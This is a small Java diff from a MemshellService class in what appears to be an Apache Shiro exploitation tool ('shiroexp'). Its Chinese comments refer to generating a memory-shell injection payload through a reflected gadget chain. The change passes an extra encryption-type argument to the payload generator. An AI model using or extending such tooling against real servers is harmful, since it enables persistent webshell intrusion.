@@ -118,8 +118,8 @@ public class MemshellService {
 
         // 获取内存马注入的payload
         Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);      // 反射获取利用链
-        Method method = gadget_clazz.getDeclaredMethod("genMemPayload", String.class);
-        String payload = (String) method.invoke(null, targetOBJ.getKey());
+        Method method = gadget_clazz.getDeclaredMethod("genMemPayload", String.class, String.class);
+        String payload = (String) method.invoke(null, targetOBJ.getKey(), targetOBJ.getCryptType());
 
         // 构造请求头
         Map<String, String> headers = new HashMap<>();
